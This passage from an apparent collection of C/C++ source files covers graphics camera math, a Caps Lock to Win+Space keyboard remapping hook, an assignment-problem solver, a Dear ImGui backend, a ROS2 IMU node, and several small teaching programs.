45.0f;\n    }\n\n    void Camera::UpdateCameraVectors()\n    {\n        // Calculate the new Front vector\n        glm::vec3 front;\n        front.x = static_cast<float>(cos(glm::radians(m_Yaw)) * cos(glm::radians(m_Pitch)));\n        front.y = static_cast<float>(sin(glm::radians(m_Pitch)));\n        front.z = static_cast<float>(sin(glm::radians(m_Yaw)) * cos(glm::radians(m_Pitch)));\n\n        m_Front = glm::normalize(front);\n\n        // Also re-calculate the Right and Up vector\n        m_Right = glm::normalize(glm::cross(m_Front, m_WorldUp));  // Normalize the vectors, because their length gets closer to 0 the more you look up or down which results in slower movement.\n        m_Up    = glm::normalize(glm::cross(m_Right, m_Front));\n    }\n} // namespace breakout\n",
    "#include \"KeyboardHook.h\"\n#include <string>\n\n// Global variable.\nHHOOK KeyboardHook;\n\nvoid SetWindowsHook(HINSTANCE hInstance)\n{\n\t// \u00d3\u00ea\u00e0\u00e7\u00fb\u00e2\u00e0\u00e5\u00ec \u00f2\u00e8\u00ef \u00f5\u00f3\u00ea\u00e0, \u00ea\u00f3\u00e4\u00e0 \u00ef\u00e5\u00f0\u00e5\u00e4\u00e0\u00e5\u00ec \u00f3\u00ef\u00f0\u00e0\u00e2\u00eb\u00e5\u00ed\u00e8\u00e5 \u00f5\u00f3\u00ea\u00ee\u00ec, \u00f3\u00ea\u00e0\u00e7\u00fb\u00e2\u00e0\u00e5\u00ec \u00e8\u00ed\u00f1\u00f2\u00e0\u00ed\u00f1 \u00ef\u00f0\u00e8\u00eb\u00ee\u00e6\u00e5\u00ed\u00e8\u00ff \u00f7\u00f2\u00ee\u00e1\u00fb \u00f1\u00e8\u00f1\u00f2\u00e5\u00ec\u00e0 \u00e7\u00ed\u00e0\u00eb\u00e0 \u00ea\u00f2\u00ee \u00f1\u00f2\u00e0\u00e2\u00e8\u00f2 \u00f5\u00f3\u00ea, \u00e8 NULL \u00e4\u00eb\u00ff \u00f3\u00f1\u00f2\u00e0\u00ed\u00ee\u00e2\u00ea\u00e8 \u00f5\u00f3\u00ea\u00e0 \u00e3\u00eb\u00ee\u00e1\u00e0\u00eb\u00fc\u00ed\u00ee.\n\tKeyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, LLKeyboardHook, hInstance, NULL);\n}\n\nvoid UnsetWindowsHook() \n{ \n\tUnhookWindowsHookEx(KeyboardHook); \n}\n\nLRESULT CALLBACK LLKeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)\n{\n\tif (nCode == HC_ACTION)\n\t{\n\t\tKBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;\n\t\t\n\t\tauto key = p->vkCode;\n\t\t\n\t\tstd::wstring strValue = std::to_wstring(key);\n\t\tLPCWSTR str = strValue.c_str();\n\n\t\tif (p->vkCode == VK_CAPITAL && wParam == WM_KEYDOWN)\n\t\t{\n\t\t\tINPUT inputs[4] = {};\n\n\t\t\tinputs[0].type = INPUT_KEYBOARD;\n\t\t\tinputs[0].ki.wVk = VK_LWIN;\n\n\t\t\tinputs[1].type = INPUT_KEYBOARD;\n\t\t\tinputs[1].ki.wVk = VK_SPACE;\n\n\t\t\tinputs[2].type = INPUT_KEYBOARD;\n\t\t\tinputs[2].ki.wVk = VK_LWIN;\n\t\t\tinputs[2].ki.dwFlags = KEYEVENTF_KEYUP;\n\n\t\t\tinputs[3].type = INPUT_KEYBOARD;\n\t\t\tinputs[3].ki.wVk = VK_SPACE;\n\t\t\tinputs[3].ki.dwFlags = KEYEVENTF_KEYUP;\n\n\t\t\tSendInput(ARRAYSIZE(inputs), inputs, sizeof(INPUT));\n\t\t\treturn 1;\n\t\t}\n\t}\n\t// Null \u00f2\u00ea \u00e0\u00e2\u00f2\u00ee\u00ec\u00e0\u00f2\u00e8\u00f7\u00e5\u00f1\u00ea\u00e8 \u00e1\u00e5\u00f0\u00e5\u00f2\u00f1\u00ff \u00f2\u00e5\u00ea\u00f3\u00f9\u00e8\u00e9 \u00f5\u00f3\u00ea.\n\treturn CallNextHookEx(NULL, nCode, wParam, lParam);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#include \"lapjv.h\"\n#include <Eigen/Core>\n\nusing namespace Eigen;\n\n/** Column-reduction and reduction transfer for a dense cost matrix.\n */\nint_t _ccrrt_dense(const uint_t n, MatrixXd cost,\n                   VectorXi &free_rows, VectorXi &x, VectorXi &y, VectorXd &v) {\n    int_t n_free_rows;\n    boolean *unique;\n\n    for (uint_t i = 0; i < n; i++) {\n        x[i] = -1;\n        v[i] = LARGE;\n        y[i] = 0;\n    }\n    for (uint_t i = 0; i < n; i++) {\n        for (uint_t j = 0; j < n; j++) {\n            const cost_t c = cost(i, j);\n            if (c < v[j]) {\n                v[j] = c;\n                y[j] = i;\n            }\n            PRINTF(\"i=%d, j=%d, c[i,j]=%f, v[j]=%f y[j]=%d\\n\", i, j, c, v[j], y[j]);\n        }\n    }\n    PRINT_COST_ARRAY(v, n);\n    PRINT_INDEX_ARRAY(y, n);\n    NEW(unique, boolean, n);\n    memset(unique, TRUE, n);\n    {\n        int_t j = n;\n        do {\n            j--;\n            const int_t i = y[j];\n            if (x[i] < 0) {\n                x[i] = j;\n            } else {\n                unique[i] = FALSE;\n                y[j] = -1;\n            }\n        } while (j > 0);\n    }\n    n_free_rows = 0;\n    for (uint_t i = 0; i < n; i++) {\n        if (x[i] < 0) {\n            free_rows[n_free_rows++] = i;\n        } else if (unique[i]) {\n            const int_t j = x[i];\n            cost_t min = LARGE;\n            for (uint_t j2 = 0; j2 < n; j2++) {\n                if (j2 == (uint_t) j) {\n                    continue;\n                }\n                const cost_t c = cost(i, j2) - v[j2];\n                if (c < min) {\n                    min = c;\n                }\n            }\n            PRINTF(\"v[%d] = %f - %f\\n\", j, v[j], min);\n            v[j] -= min;\n        }\n    }\n    FREE(unique);\n    return n_free_rows;\n}\n\n\n/** Augmenting row reduction for a dense cost matrix.\n */\nint_t _carr_dense(\n        const uint_t n, MatrixXd cost,\n        const uint_t n_free_rows,\n        VectorXi &free_rows, VectorXi &x, VectorXi &y, VectorXd &v) {\n    uint_t current = 0;\n    int_t new_free_rows = 0;\n    uint_t rr_cnt = 0;\n    PRINT_INDEX_ARRAY(x, n);\n    PRINT_INDEX_ARRAY(y, n);\n    PRINT_COST_ARRAY(v, n);\n    PRINT_INDEX_ARRAY(free_rows, n_free_rows);\n    while (current < n_free_rows) {\n        int_t i0;\n        int_t j1, j2;\n        cost_t v1, v2, v1_new;\n        boolean v1_lowers;\n\n        rr_cnt++;\n        PRINTF(\"current = %d rr_cnt = %d\\n\", current, rr_cnt);\n        const int_t free_i = free_rows[current++];\n        j1 = 0;\n        v1 = cost(free_i, 0) - v[0];\n        j2 = -1;\n        v2 = LARGE;\n        for (uint_t j = 1; j < n; j++) {\n            PRINTF(\"%d = %f %d = %f\\n\", j1, v1, j2, v2);\n            const cost_t c = cost(free_i, j) - v[j];\n            if (c < v2) {\n                if (c >= v1) {\n                    v2 = c;\n                    j2 = j;\n                } else {\n                    v2 = v1;\n                    v1 = c;\n                    j2 = j1;\n                    j1 = j;\n                }\n            }\n        }\n        i0 = y[j1];\n        v1_new = v[j1] - (v2 - v1);\n        v1_lowers = v1_new < v[j1];\n        PRINTF(\"%d %d 1=%d,%f 2=%d,%f v1'=%f(%d,%g) \\n\", free_i, i0, j1, v1, j2, v2, v1_new, v1_lowers, v[j1] - v1_new);\n        if (rr_cnt < current * n) {\n            if (v1_lowers) {\n                v[j1] = v1_new;\n            } else if (i0 >= 0 && j2 >= 0) {\n                j1 = j2;\n                i0 = y[j2];\n            }\n            if (i0 >= 0) {\n                if (v1_lowers) {\n                    free_rows[--current] = i0;\n                } else {\n                    free_rows[new_free_rows++] = i0;\n                }\n            }\n        } else {\n            PRINTF(\"rr_cnt=%d >= %d (current=%d * n=%d)\\n\", rr_cnt, current * n, current, n);\n            if (i0 >= 0) {\n                free_rows[new_free_rows++] = i0;\n            }\n        }\n        x[free_i] = j1;\n        y[j1] = free_i;\n    }\n    return new_free_rows;\n}\n\n\n/** Find columns with minimum d[j] and put them on the SCAN list.\n */\nuint_t _find_dense(const uint_t n, uint_t lo, VectorXd d, VectorXi &cols, VectorXi &y) {\n    uint_t hi = lo + 1;\n    cost_t mind = d[cols[lo]];\n    for (uint_t k = hi; k < n; k++) {\n        int_t j = cols[k];\n        if (d[j] <= mind) {\n            if (d[j] < mind) {\n                hi = lo;\n                mind = d[j];\n            }\n            cols[k] = cols[hi];\n            cols[hi++] = j;\n        }\n    }\n    return hi;\n}\n\n\n// Scan all columns in TODO starting from arbitrary column in SCAN\n// and try to decrease d of the TODO columns using the SCAN column.\nint_t _scan_dense(const uint_t n, MatrixXd cost,\n                  uint_t *plo, uint_t *phi,\n                  VectorXd &d, VectorXi &cols, VectorXi &pred,\n                  VectorXi &y, VectorXd &v) {\n    uint_t lo = *plo;\n    uint_t hi = *phi;\n    cost_t h, cred_ij;\n\n    while (lo != hi) {\n        int_t j = cols[lo++];\n        const int_t i = y[j];\n        const cost_t ",
    "// dear imgui: Platform Backend for Windows (standard windows API for 32 and 64 bits applications)\n// This needs to be used along with a Renderer (e.g. DirectX11, OpenGL3, Vulkan..)\n\n// Implemented features:\n//  [X] Platform: Clipboard support (for Win32 this is actually part of core dear imgui)\n//  [X] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange'.\n//  [X] Platform: Keyboard arrays indexed using VK_* Virtual Key Codes, e.g. ImGui::IsKeyPressed(VK_SPACE).\n//  [X] Platform: Gamepad support. Enabled with 'io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad'.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// If you are new to Dear ImGui, read documentation from the docs/ folder + read the top of imgui.cpp.\n// Read online: https://github.com/ocornut/imgui/tree/master/docs\n\n#include \"imgui.h\"\n#include \"imgui_impl_win32.h\"\n#ifndef WIN32_LEAN_AND_MEAN\n#define WIN32_LEAN_AND_MEAN\n#endif\n#include <windows.h>\n#include <tchar.h>\n#include <dwmapi.h>\n\n// Configuration flags to add in your imconfig.h file:\n//#define IMGUI_IMPL_WIN32_DISABLE_GAMEPAD              // Disable gamepad support. This was meaningful before <1.81 but we now load XInput dynamically so the option is now less relevant.\n\n// Using XInput for gamepad (will load DLL dynamically)\n#ifndef IMGUI_IMPL_WIN32_DISABLE_GAMEPAD\n#include <xinput.h>\ntypedef DWORD (WINAPI *PFN_XInputGetCapabilities)(DWORD, DWORD, XINPUT_CAPABILITIES*);\ntypedef DWORD (WINAPI *PFN_XInputGetState)(DWORD, XINPUT_STATE*);\n#endif\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2021-08-17: Calling io.AddFocusEvent() on WM_SETFOCUS/WM_KILLFOCUS messages.\n//  2021-08-02: Inputs: Fixed keyboard modifiers being reported when host windo doesn't have focus.\n//  2021-07-29: Inputs: MousePos is correctly reported when the host platform window is hovered but not focused (using TrackMouseEvent() to receive WM_MOUSELEAVE events).\n//  2021-06-29: Reorganized backend to pull data from a single structure to facilitate usage with multiple-contexts (all g_XXXX access changed to bd->XXXX).\n//  2021-06-08: Fixed ImGui_ImplWin32_EnableDpiAwareness() and ImGui_ImplWin32_GetDpiScaleForMonitor() to handle Windows 8.1/10 features without a manifest (per-monitor DPI, and properly calls SetProcessDpiAwareness() on 8.1).\n//  2021-03-23: Inputs: Clearing keyboard down array when losing focus (WM_KILLFOCUS).\n//  2021-02-18: Added ImGui_ImplWin32_EnableAlphaCompositing(). Non Visual Studio users will need to link with dwmapi.lib (MinGW/gcc: use -ldwmapi).\n//  2021-02-17: Fixed ImGui_ImplWin32_EnableDpiAwareness() attempting to get SetProcessDpiAwareness from shcore.dll on Windows 8 whereas it is only supported on Windows 8.1.\n//  2021-01-25: Inputs: Dynamically loading XInput DLL.\n//  2020-12-04: Misc: Fixed setting of io.DisplaySize to invalid/uninitialized data when after hwnd has been closed.\n//  2020-03-03: Inputs: Calling AddInputCharacterUTF16() to support surrogate pairs leading to codepoint >= 0x10000 (for more complete CJK inputs)\n//  2020-02-17: Added ImGui_ImplWin32_EnableDpiAwareness(), ImGui_ImplWin32_GetDpiScaleForHwnd(), ImGui_ImplWin32_GetDpiScaleForMonitor() helper functions.\n//  2020-01-14: Inputs: Added support for #define IMGUI_IMPL_WIN32_DISABLE_GAMEPAD/IMGUI_IMPL_WIN32_DISABLE_LINKING_XINPUT.\n//  2019-12-05: Inputs: Added support for ImGuiMouseCursor_NotAllowed mouse cursor.\n//  2019-05-11: Inputs: Don't filter value from WM_CHAR before calling AddInputCharacter().\n//  2019-01-17: Misc: Using GetForegroundWindow()+IsChild() instead of GetActiveWindow() to be compatible with windows created in a different thread or parent.\n//  2019-01-17: Inputs: Added support for mouse buttons 4 and 5 via WM_XBUTTON* messages.\n//  2019-01-15: Inputs: Added support for XInput gamepads (if ImGuiConfigFlags_NavEnableGamepad is set by user application).\n//  2018-11-30: Misc: Setting up io.BackendPlatformName so it can be displayed in the About Window.\n//  2018-06-29: Inputs: Added support for the ImGuiMouseCursor_Hand cursor.\n//  2018-06-10: Inputs: Fixed handling of mouse wheel messages to support fine position messages (typically sent by track-pads).\n//  2018-06-08: Misc: Extracted imgui_impl_win32.cpp/.h away from the old combined DX9/DX10/DX11/DX12 examples.\n//  2018-03-20: Misc: Setup io.BackendFlags ImGuiBackendFlags_HasMouseCursors and ImGuiBackendFlags_HasSetMousePos flags + honor ImGuiConfigFlags_NoMouseCursorChange flag.\n//  2018-02-20: Inputs: Added support for mouse cursors (ImGui::GetMouseCursor() value and WM_SETCURSOR message handling).\n//  2018-02-06: Inputs: Added mapping for ImGuiKey_Space.\n//  2018-02-06: Inputs: Honoring the io.WantSetMousePos by repositioning the mouse (when ",
    "#include <chrono>\n#include <functional>\n#include <memory>\n#include <string>\n\n#include \"rclcpp/rclcpp.hpp\"\n#include \"sensor_msgs/msg/imu.hpp\"\n\n#include \"bno055.hpp\"\n\nusing namespace std::chrono_literals;\n\n/* This example creates a subclass of Node and uses std::bind() to register a\n* member function as a callback from the timer. */\n\nclass ImuNode : public rclcpp::Node {\npublic:\n    ImuNode(std::string_view devDirectory, uint8_t devAddress)\n        : Node(\"imu_node\"), imu_(devDirectory, devAddress) {\n\n        publisher_ = this->create_publisher<sensor_msgs::msg::Imu>(\"imu\",\n            rclcpp::QoS(rclcpp::QoSInitialization::from_rmw(rmw_qos_profile_sensor_data)));\n        timer_ = this->create_wall_timer(\n            10ms, std::bind(&ImuNode::timer_callback, this));\n\n        constexpr std::array accelCovariance = { 0.017, 0.017, 0.017 };\n        constexpr std::array gyroCovariance = { 0.04, 0.04, 0.04 };\n        constexpr std::array quatCovariance = { 0.0159, 0.0159, 0.0159 };\n\n        for (size_t i = 0; i < imuMsg_.angular_velocity_covariance.size(); i++) {\n            if (i % 3 == 0) {\n                imuMsg_.angular_velocity_covariance[i] = gyroCovariance[i / 3];\n                imuMsg_.linear_acceleration_covariance[i] = accelCovariance[i / 3];\n                imuMsg_.orientation_covariance[i] = quatCovariance[i / 3];\n            } else {\n                imuMsg_.angular_velocity_covariance[i] = 0;\n                imuMsg_.linear_acceleration_covariance[i] = 0;\n                imuMsg_.orientation_covariance[i] = 0;\n            }\n        }\n        imuMsg_.header.frame_id = \"base_link\";\n    }\n\n    ~ImuNode() {\n        RCLCPP_INFO(this->get_logger(), \"Destroying Imu Node!\\n\");\n    }\n\nprivate:\n    void timer_callback() {\n        try {\n            auto accel = imu_.getLinearAccelMsq();\n            auto gyro = imu_.getGyroRps();\n            auto quats = imu_.getQuaternion();\n\n            imuMsg_.header.set__stamp(this->now());\n\n            imuMsg_.linear_acceleration.x = accel.x;\n            imuMsg_.linear_acceleration.y = accel.y;\n            imuMsg_.linear_acceleration.z = accel.z;\n\n            imuMsg_.angular_velocity.x = gyro.x;\n            imuMsg_.angular_velocity.y = gyro.y;\n            imuMsg_.angular_velocity.z = gyro.z;\n\n            imuMsg_.orientation.w = quats.w;\n            imuMsg_.orientation.x = quats.x;\n            imuMsg_.orientation.y = quats.y;\n            imuMsg_.orientation.z = quats.z;\n\n            RCLCPP_INFO(this->get_logger(), \"LinearAccel: x: %3.2f,  y: %3.2f,  z: %3.2f\\n\", accel.x, accel.y, accel.z);\n            RCLCPP_INFO(this->get_logger(), \"AngularVel : x: %3.2f,  y: %3.2f,  z: %3.2f\\n\", gyro.x, gyro.y, gyro.z);\n            RCLCPP_INFO(this->get_logger(), \"Quaternion : w: %3.2f,  x: %3.2f,  y: %3.2f,  z: %3.2f\\n\\n\", quats.w, quats.x, quats.y, quats.z);\n            publisher_->publish(imuMsg_);\n        } catch (std::runtime_error& err) {\n            RCLCPP_ERROR(this->get_logger(), \"Sensor connection is lost!\\n\");\n            if (!imu_.reconnect()) {\n                std::this_thread::sleep_for(1s);\n            }\n        }\n    }\n    rclcpp::TimerBase::SharedPtr timer_;\n    rclcpp::Publisher<sensor_msgs::msg::Imu>::SharedPtr publisher_;\n    sensor_msgs::msg::Imu imuMsg_ = sensor_msgs::msg::Imu();\n    imu::BNO055 imu_ {};\n};\n\nint main(int argc, char* argv[]) {\n\n    rclcpp::init(argc, argv);\n\n    if (argc != 3) {\n        RCLCPP_ERROR(rclcpp::get_logger(\"rclcpp\"), \"Invalid command line arguments!\\n\");\n        return -1;\n    }\n\n    std::string_view devDirectory { argv[1] };\n\n    uint8_t devAddress {};\n    try {\n        auto devAdressInput = std::stoul(argv[2], nullptr, 16);\n        if (devAdressInput > std::numeric_limits<uint8_t>().max()) {\n            RCLCPP_ERROR(rclcpp::get_logger(\"rclcpp\"), \"Device I2C adress is not valid!\\n\");\n            return -1;\n        } else {\n            devAddress = static_cast<uint8_t>(devAdressInput);\n        }\n\n    } catch (std::invalid_argument& err) {\n        RCLCPP_ERROR(rclcpp::get_logger(\"rclcpp\"), \"Argument \\\"%5s\\\" is not a proper I2C adress!\\n\", argv[2]);\n        return -1;\n    }\n\n    while (rclcpp::ok()) {\n        try {\n            std::shared_ptr<ImuNode> node = std::make_shared<ImuNode>(devDirectory, devAddress);\n            if (node != nullptr) {\n                rclcpp::spin(node);\n            } \n        } catch (std::runtime_error& err) {\n            RCLCPP_ERROR(rclcpp::get_logger(\"rclcpp\"), \"Cannot connect to I2C device!\\n\");\n        }\n        std::this_thread::sleep_for(1s);\n    }\n\n    rclcpp::shutdown();\n    return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"grocery_shop_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/* This example demonstrates how to use multiple threads with mutex to safely access and modify shared data\n           & Vector and Map for dynamic array and accessing arrays with keyes\n                      & conio.h for Keyboard input while runtime                                                                    \n                             & Chrono for time management                                                        */\n\n#include \"Multi.h\"\n\n\n\n//  Addition Method from Multi\nvoid Multi :: add ( int a , int b , std::string index ) {\n\n    // Lock_gaurd is like smart ptr , they will unlock when ever they go out of scope / if not using lock_guard , we should manually call .lock() and .unlock() on our mutex .\n    // out of scope = When the execution leaves its block (e.g., a function, loop, or conditional statement) , the variable goes out of scope, and its destructor is automatically called .\n    // Locking the mutex , ensures the mutex is locked then no other Thread could not access the shared data = protecting the shared data.\n    std::lock_guard<std::mutex> lock ( this-> mtx );\n                                              \n    this->Results [index] = a + b;\n}\n\n\n\n//  Keyboard input Method , while we are using it from a Thread the data inside this method will setted to the object we sent via Thread calling this method (Multi)\n//  Hold Key System applied\nvoid Multi::input ()\n{\n    while ( Multi::IsRunning )\n    {\n        std::lock_guard<std::mutex> lock ( this->mtx );     // This is not Necessary Here , Because we need it only when there is more than one Thread Accessing A Method .\n        if ( _kbhit () )    // _kbhit() is for getting input while runtime without stopping the Console , means = Keyboard Hit .\n        {\n            Multi::Key = _getch ();   // Get Character from Keyboard hit\n\n            if ( Multi::Key == 's' )\n            {\n                Multi::Run = true;\n            }\n            \n            else if ( Multi::Key == 27 ) // 27 is Equivalent to Esc Key on keyboard , this will let program to quit .\n            {\n                Multi::IsRunning = false;\n            }\n        }\n        else\n        {\n          Multi::Run = false;\n        }\n    }\n\n}\n\n\n\n//  Merthod for output Texts\nvoid Multi::Output (double DeltaTime , std::map <std::string , int >  Results , std::map <std::string , int >  VeciResults )\n{\n    //  Calculate Delta Time for user systems CPU .\n    std::cout << \"   ===== \" << \"Systems Delta Time =>\" << DeltaTime << \" ===== \\n\";\n    std::cout << \"   * \" << \"*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*\" << \" * \\n\";\n\n    //  Show Addition\n    for ( auto i = Results.begin (); i != Results.end (); i++ ) {\n        std::cout << \"   *  Result of addition    \" << i->first << i->second << \"  *\\n\";\n    }\n\n    //  line \n    std::cout << \"   * \" << \"*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*\" << \" * \\n\";\n    std::cout << \"   *************************************** \\n\";\n    std::cout << \"   * \" << \"*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*\" << \" * \\n\";\n\n    //  Show Subtraction\n    for ( auto i = VeciResults.begin (); i != VeciResults.end (); i++ )\n    {\n        std::cout << \"   *  Result of Subtraction \" << i->first << i->second << \"  *\\n\";\n    }\n\n    //  line \n    std::cout << \"   * \" << \"*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*\" << \" * \\n\\n\";\n}\n\n\n\n\n\n//  MultiVec Methods\n//  Subtracion Method from MultiVec\nvoid MultiVec::Subtraction ( int a , int b , std::string index ){\n\n    std::lock_guard<std::mutex> lock ( this-> mtx );\n\n    this->Results [index] = a - b;\n}\n\n\n\n//  Calculate DeltaTime\ndouble MultiVec::DeltaTime ()\n{\n    // For Calculating Delta Time\n    // The Theory is => when we start two times , the time that will spend till the second call by system Hardware will be Delta time of the System .\n    std::chrono::duration<double , std::milli> DeltaSecond = std::chrono::duration<double , std::milli> ( this->End - this->Start );\n    return DeltaSecond.count ();\n}\n\n\n\n//  By This Method we will set a Time\n//  Using Refrenced Method is so much important , Because it will change data from variable we pass to it .\nvoid MultiVec::SetDelay ( std::chrono::steady_clock::time_point & DelayStart )\n{\n    std::lock_guard<std::mutex> lock ( this->mtx );\n\n    DelayStart = std::chrono::high_resolution_clock::now ();\n}\n\n\n\n//  By This Method we will Calculate Delay from our Setted time and the exact moment we are when we call this\nvoid MultiVec::Delay ( int MilliSeconds , std::chrono::steady_clock::time_point & DelayStartVec , int VectorValue )\n{\n    std::lock_guard<std::mutex> lock ( this->mtx );\n    // I had hard time to undrestand how Chrono works exactly , But finally now i know = > Those Time points will work with System time , by setting them with new() we will not set a ( 0 ) time , ...\n        // Instead we will save our system time at that point , in here by SetDelay() we will set a specific time from that moment of our system , then we will subtract times from system times\n            // at each frame from time point ",
    "\ufeff#include <iostream>\r\n#include <iomanip>\r\n\r\nvoid InputEps(float& eps) {\r\n\tstd::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u0442\u043e\u0447\u043d\u043e\u0441\u0442\u0438 \u0432\u044b\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u044f \u0438\u043d\u0442\u0435\u0433\u0440\u0430\u043b\u0430.\\n\";\r\n\twhile (true) {\r\n\t\tstd::cout << \"eps: \";\r\n\t\tstd::cin >> eps;\r\n\t\tif (eps > pow(10, -4)) break;\r\n\t\telse std::cout << \"\u0412\u044b \u0432\u0432\u0435\u043b\u0438 \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435. \u041f\u043e\u043f\u0440\u043e\u0431\u0443\u0439\u0442\u0435 \u0435\u0449\u0435 \u0440\u0430\u0437.\" << std::endl;\r\n\t}\r\n}\r\n\r\nfloat f(float x) {\r\n\treturn (float)pow(x, 2) * exp(-0.5 * x);\r\n}\r\n\r\nfloat SimpsoneIntegration(int a, int b, int n) {\r\n\tfloat h = (float)(b - a) / n;\r\n\tfloat integral = f(a) + f(b);\r\n\tshort int k;\r\n\tfor (size_t i = 1; i < n - 1; i++) {\r\n\t\tk = 2 + 2 * (i % 2);\r\n\t\tintegral += k * f(a + h * i);\r\n\t}\r\n\tintegral *= h / 3;\r\n\treturn integral;\r\n}\r\n\r\nvoid Solution(int a, int b, int& n, float eps, float& integrationValue) {\r\n\tfloat integral_old = SimpsoneIntegration(a, b, n);\r\n\twhile (true) {\r\n\t\tn *= 2;\r\n\t\tfloat integral_new = SimpsoneIntegration(a, b, n);\r\n\t\tif (fabs(integral_new - integral_old) <= eps) {\r\n\t\t\tintegrationValue = integral_new;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tintegral_old = integral_new;\r\n\t}\r\n}\r\n\r\nint main() {\r\n\tsetlocale(LC_ALL, \"ru\");\r\n\tint n = 2;\r\n\tint startN = n;\r\n\tint a = 0;\r\n\tfloat eps;\r\n\tfloat integrationValue;\r\n\tInputEps(eps);\r\n\tstd::cout << std::setw(5) << \"\u041f\u0430\u0440\u0430\u043c\u0435\u0442\u0440 b\" << std::setw(15) << \"\u0418\u043d\u0442\u0435\u0433\u0440\u0430\u043b\" << std::setw(20) << \"\u041a\u043e\u043b-\u0432\u043e \u043e\u0442\u0440\u0435\u0437\u043a\u043e\u0432\" << std::endl;\r\n\tfor (int b = 1; b <= 10; b++) {\r\n\t\tSolution(a, b, n, eps, integrationValue);\r\n\t\tstd::cout << std::setw(5) << b << std::setw(20) << std::fixed << std::setprecision(10) << integrationValue << std::setw(20) << n << std::endl;\r\n\t\tn = startN;\r\n\t}\r\n}\r\n\r\n",
    "#include <iostream> \r\nusing namespace std;\r\n\r\nstruct Node{\r\n    int data;\r\n    Node* next;\r\n};\r\n\r\nvoid addNode(Node* &head, int value){\r\n    Node* newNode = new Node();   //Crear un nuevo nodo en la memoria\r\n    newNode -> data = value;    //Asignacion de value a la estructura a data\r\n    newNode -> next = nullptr; //el siguiente nodo es nulptr\r\n\r\n    if (head == nullptr){\r\n        head = newNode;  //Si la lista esta vac\u00eda el nuevo nodo es el head\r\n    }\r\n\r\n    else{\r\n        Node* temp = head; // crear una variente temporal qe alcance el current head\r\n        //recorremos la lista hasta el \u00faltimo nodo\r\n        while(temp -> next != nullptr){\r\n            temp = temp -> next;\r\n        }\r\n        temp -> next = newNode; //enlazamos\r\n    }\r\n}\r\n\r\nvoid showList(Node* head){\r\n    Node* temp = head;\r\n    while(temp != nullptr){\r\n        cout << temp -> data << \"->\";\r\n        temp = temp -> next;\r\n    }\r\n}\r\n\r\nint main(){\r\n\r\n    Node* list = nullptr;\r\n    addNode(list, 40);\r\n    addNode(list, 10);\r\n    addNode(list, 890);\r\n\r\n    cout << \"Lista de valores \" << endl;\r\n    showList(list);\r\n\r\n    return 0;\r\n}",
    "#include <Arduino.h>\n#include \"system/SystemManager.h\"\n#include \"applications/Tim/ChessAnimation.h\"\n#include \"applications/Tim/HelloRobo.h\"\n#include \"applications/Tim/RacingGame.h\"\n#include \"applications/Tim/Rainbow.h\"\n#include \"applications/Tim/Snake.h\"\n#include \"applications/Tim/CircleAnimation.h\"\n#include \"applications/Tim/Pumpkin.h\"\n#include \"applications/Totem/Totem.h\"\n#include \"applications/PixelRunner.h\"\n\nSystemManager sm;\n#define DEBUG_WIFI\n\nvoid setup()\n{\n\n  sm.register_application(ChessAnimation::create, \"Chess Animation\", \"Tim\");\n  sm.register_application(HelloRobo::create, \"HelloRobo\", \"Tim\");\n  sm.register_application(RacingGame::create, \"SuperRacer\", \"Tim\");\n  sm.register_application(Snake::create, \"Snake\", \"Tim\");\n  sm.register_application(Rainbow::create, \"Rainbow\", \"Tim\");\n  sm.register_application(CircleAnimation::create, \"Circle Animation\", \"Tim\");\n  sm.register_application(Pumpkin::create, \"Pumpkin\", \"Tim\");\n  sm.register_application(Totem::create, \"Totem\", \"Insert name here\");\n  sm.register_application(PixelRunner::create, \"PixelRunner\", \"Pixel Runners\");\n  sm.init();\n\n  sm.switch_project(5);\n  Serial.println(ESP.getResetInfo());\n}\n\nvoid loop()\n{\n  sm.loop();\n  delay(1);\n}\n",
